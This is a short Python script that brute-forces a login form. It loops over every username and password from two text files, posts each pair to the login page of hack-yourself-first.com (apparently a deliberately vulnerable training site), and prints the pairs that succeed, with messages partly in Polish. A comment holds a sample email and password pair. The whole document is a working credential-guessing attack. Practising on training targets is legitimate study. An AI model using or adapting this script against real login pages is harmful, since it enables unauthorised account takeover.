import requests
#troyhunt@hotmail.com:admintest
with open(r"users.txt", "r") as usersFile, open(r"passwords.txt", "r") as passwordsFile:
    users = usersFile.read().split('\n')
    passwords = passwordsFile.read().split('\n')
for user in users:
    for password in passwords:
        url = "https://hack-yourself-first.com/Account/Login"
        session = requests.session()
        payload = {"Email": user, "Password": password}
        conn = session.post(url, data=payload)
        if "Log off" in conn.text:
            print("Udało się zalogować: Username: {}, haslo: {}".format(user, password))
            break
        else:
            print("[DEBUG] {}:{}".format(user, password))
